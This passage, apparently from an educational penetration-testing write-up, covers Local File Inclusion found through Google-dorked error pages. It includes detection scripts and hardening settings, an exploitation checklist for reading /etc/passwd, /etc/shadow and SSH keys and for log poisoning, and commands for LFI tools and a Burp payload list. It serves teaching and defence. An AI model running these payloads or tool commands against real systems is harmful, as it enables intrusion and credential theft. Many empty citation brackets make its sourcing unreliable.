tail -f "$LOG_FILE" | while read line; do
    if echo "$line" | grep -qE "(\.\./|etc/passwd|php://|\.htpasswd|\.htaccess)"; then
        echo "[ALERT] Potential LFI attack detected: $line" | \
        mail -s "Security Alert: LFI Attack Detected" "$ALERT_EMAIL"
        
        logger -t LFI-ALERT "Potential LFI attack: $line"
    fi
done
```

**SIEM Integration (Splunk Query Example)**:

```
index=web_logs 
| search (query="*../*" OR query="*etc/passwd*" OR query="*php://*" OR query="*.htpasswd*")
| stats count by src_ip, query, uri
| where count > 3
| alert "Potential LFI Attack Campaign"
```


***

## üîê Long-Term Security Hardening

### 1. File System Permissions

```bash
# Restrictive permissions on sensitive files
chmod 600 /etc/apache2/.htpasswd
chmod 600 /var/www/html/config.php
chmod 600 /var/www/html/.env

# Web server user cannot read system files
chown root:root /etc/passwd
chmod 644 /etc/passwd

# Application files owned by specific user (not root)
chown -R www-data:www-data /var/www/html/
find /var/www/html/ -type d -exec chmod 755 {} \;
find /var/www/html/ -type f -exec chmod 644 {} \;
```


### 2. PHP Security Hardening

**php.ini Configuration**:

```ini
; Disable dangerous functions
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source

; Restrict file access
open_basedir = /var/www/html:/tmp:/usr/share/php
allow_url_fopen = Off
allow_url_include = Off

; Error handling (production)
display_errors = Off
log_errors = On
error_log = /var/log/php/error.log

; File uploads
file_uploads = On
upload_max_filesize = 2M
upload_tmp_dir = /var/www/uploads/temp
```


### 3. Implement Content Security Policy (CSP)

```apache
# Apache
Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none';"
```

```nginx
# Nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none';" always;
```


### 4. Regular Security Audits

```bash
# Automated vulnerability scanning
nikto -h https://target.com
nmap -sV --script=http-vuln* target.com

# Manual code review checklist
grep -r "include\(" /var/www/html/
grep -r "require\(" /var/www/html/
grep -r "\$_GET\[" /var/www/html/
grep -r "\$_POST\[" /var/www/html/
```


***

## üìä Pentester's Server Error \& LFI Exploitation Checklist

**Reconnaissance Phase**:

- [ ] Execute 500 error Google Dork queries [file:47]
- [ ] Search for framework-specific error signatures (ASP.NET, PHP, Django, Java)
- [ ] Look for stack traces and detailed error messages
- [ ] Document all discovered error pages with URLs [file:47]

**Error Analysis Phase**:

- [ ] Analyze error messages for sensitive information disclosure [file:47]
- [ ] Identify file paths and directory structure [file:47]
- [ ] Note framework versions and technology stack
- [ ] Look for file inclusion error indicators [file:47]

**LFI Testing Phase**:

- [ ] Identify parameters that might accept file paths [file:47]
- [ ] Test for basic LFI with `/etc/passwd` []
- [ ] Try path traversal with multiple `../` levels
- [ ] Test null byte injection (PHP < 5.3.4)
- [ ] Attempt PHP wrapper exploits []
- [ ] Test for filter bypasses (encoding, case variations)

**Exploitation Phase**:

- [ ] Extract sensitive system files (`/etc/passwd`, `/etc/shadow`)
- [ ] Target application configuration files (config.php, .env)
- [ ] Retrieve authentication files (`.htpasswd`, `.htaccess`) [file:47][]
- [ ] Attempt SSH key extraction (`id_rsa`)
- [ ] Read web server configuration files
- [ ] Access log files for log poisoning potential []

**Advanced Exploitation**:

- [ ] Attempt log poisoning for RCE []
- [ ] Test PHP session hijacking
- [ ] Try to include uploaded files
- [ ] Explore wrapper-based code execution
- [ ] Chain LFI with other vulnerabilities

**Reporting Phase**:

- [ ] Document complete attack chain with screenshots [file:47]
- [ ] Calculate CVSS scores for each finding
- [ ] Provide proof-of-concept (PoC) code
- [ ] Include extracted sensitive data samples (redacted)
- [ ] Write detailed remediation steps [][]

***

## üß∞ Tools for LFI Discovery and Exploitation

### 1. LFISuite - Comprehensive LFI Exploitation Framework

```bash
# Installation
git clone https://github.com/D35m0nd142/LFISuite.git
cd LFISuite
pip3 install -r requirements.txt

# Usage
python3 lfisuite.py

# Interactive menu options:
# 1. Scan for LFI vulnerabilities
# 2. Exploit discovered LFI
# 3. Extract sensitive files
# 4. Attempt RCE via log poisoning
```


### 2. FImap - File Inclusion Mapper

```bash
# Installation
git clone https://github.com/kurobeats/fimap.git
cd fimap
python setup.py install

# Usage
python fimap.py -u "https://target.com/index.php?page=test"

# Automatic exploitation mode
python fimap.py -u "https://target.com/index.php?page=test" --exploit

# Extract specific file
python fimap.py -u "https://target.com/index.php?page=test" --read=/etc/passwd
```


### 3. Kadimus - LFI/RFI Scanner and Exploiter

```bash
# Installation
git clone https://github.com/P0cL4bs/Kadimus.git
cd Kadimus
make

# Basic scan
./kadimus -u "https://target.com/index.php?page=vuln"

# Exploit with command execution
./kadimus -u "https://target.com/index.php?page=vuln" --exploit=source --cmd="cat /etc/passwd"

# RCE via log poisoning
./kadimus -u "https://target.com/index.php?page=vuln" --technique=access-log --parameter=page
```


### 4. Custom Burp Suite Extension

```python
# burp-lfi-detector.py
from burp import IBurpExtender, IScannerCheck, IScanIssue
import re

class BurpExtender(IBurpExtender, IScannerCheck):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("LFI Detector")
        callbacks.registerScannerCheck(self)
    
    def doActiveScan(self, baseRequestResponse, insertionPoint):
        # LFI payloads
        payloads = [
            "../../../etc/passwd",
            "/etc/passwd",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
        ]
        
        issues = []
        
        for payload in payloads:
            checkRequest = insertionPoint.buildRequest(payload)
            checkRequestResponse = self._callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(),
                checkRequest
            )
            
            response = self._helpers.bytesToString(
                checkRequestResponse.getResponse()
            )
            
            # Check for /etc/passwd indicators
            if re.search(r'root:.*?:0:0:', response):
                issues.append(self._createIssue(
                    baseRequestResponse,
                    checkRequestResponse,
                    insertionPoint,
                    payload
                ))
        
        return issues
```


***

## üìö Additional Resources

| **Resource** | **Description** | **URL** |
| :-- | :-- | :-- |
| OWASP LFI | Local File Inclusion Testing Guide | owasp.org/www-project-web-security-testing-guide/ [] |
| CWE-22 | Path Traversal Weakness | cwe.mitre.org/data/definitions/22.html |
| CWE-98 | PHP File Inclusion | cwe.mitre.org/data/definitions/98.html [] |
| HackTricks LFI | LFI Exploitation Techniques | book.hacktricks.xyz/pentesting-web/file-inclusion |
| VAADATA Blog | LFI Exploitation Guide | vaadata.com/blog/exploiting-an-lfi-vulnerability [] |


***

## üéì Key Takeaways for Penetration Testers

### Why This Attack Chain is Critical

1. **Passive to Active Escalation**: Starts with OSINT, escalates to active exploitation [file:47]
2. **High Impact**: Arbitrary file reading leads to credential exposure [file:47][]
3. **Common Vulnerability**: LFI remains prevalent in custom web applications [][]
4. **RCE Potential**: Log poisoning can escalate LFI to remote code execution []

### How to Use in Engagements

**Black Box Testing**:

- Always search for error pages via Google Dorking first [file:47]
- Analyze error messages for vulnerability indicators [file:47]
- Test all file-related parameters for LFI []

**Gray Box Testing**:

- Review source code for unsafe include/require statements
- Identify all dynamic file operations
- Verify input validation on file parameters

**Bug Bounty Hunting**:

- High-severity findings with clear exploitation path [file:47]
- Demonstrates real impact through credential extraction [file:47]
- Chain with other vulnerabilities for maximum impact


### What Makes a Strong Finding

Your penetration test report should include [file:47][]:

1. **Discovery Method**: Google Dork query that found the error page [file:47]
2. **Error Analysis**: What the error message revealed [file:47]
3. **Vulnerability Confirmation**: Steps to reproduce LFI []
4. **Impact Demonstration**: Files extracted (sanitized samples) [file:47]
5. **Credential Evidence**: Proof of `.htpasswd` access (without exposing real passwords) [file:47]
6. **CVSS Scoring**: Quantified risk (typically 9.0-9.8) []
7. **Detailed Remediation**: Code-level fixes and configuration changes [][]

***

## ‚öñÔ∏è Ethical and Legal Considerations

**Authorization Requirements**:

- Google Dorking public error pages is generally legal
- Active LFI testing requires explicit written authorization []
- Reading system files like `/etc/passwd` is active exploitation
- Never exfiltrate actual user data beyond PoC samples

**Responsible Disclosure** [file:47]:

- Notify client immediately of critical LFI vulnerability
- Provide emergency mitigation steps (disable affected functionality)
- Do not publicly disclose until client has patched
- Follow coordinated disclosure timelines (typically 90 days)

**Data Handling**:

- Delete all extracted files after documenting findings [file:47]
- Use anonymized samples in reports
- Encrypt all evidence and communications
- Follow data retention policies in engagement contract

**Professional Standards**:

- Test only authorized systems within defined scope
- Document all testing activities for audit trail
- Maintain confidentiality of client vulnerabilities
- Adhere to industry certifications (OSCP, CEH, PNPT, GPEN)

***

## üèÅ Conclusion

This demonstration illustrates a critical vulnerability chain beginning with passive OSINT reconnaissance and escalating to active exploitation [file:47]. The discovery of an internal server error page through Google Dorking revealed a Local File Inclusion vulnerability that enabled arbitrary file reading [file:47][][]. By exploiting this LFI, the `.htpasswd` authentication file was accessed, exposing administrative credentials in plaintext [file:47][][].

For penetration testers, this attack chain demonstrates:

- **Reconnaissance Value**: Error pages provide actionable intelligence [file:47][][]
- **Vulnerability Chaining**: Information disclosure leads to exploitation [file:47]
- **Real-World Impact**: From Google Dork to credential compromise in minutes [file:47]
- **RCE Potential**: LFI can be escalated to remote code execution []

The systematic methodology documented in this writeup‚Äîfrom error page discovery through LFI exploitation to credential extraction‚Äîrepresents a common and highly effective penetration testing approach [file:47][][]. Organizations must implement proper error handling, secure file inclusion practices, and defense-in-depth security controls to prevent this critical vulnerability class [][][].

***


---

## üìù About This Documentation

**Practical Testing Performed By**: Muhammad Izaz Haider

**Course**: EC-Council's Short Course - *Web Application Security Testing with Google Hacking*

**Purpose**: This documentation demonstrates the practical application of Google Dorking techniques learned during the course, transforming theoretical knowledge into hands-on security testing methodologies.

---

*This writeup is intended for educational purposes and authorized security testing only. Unauthorized testing of systems you don't own or have explicit permission to test is illegal.*
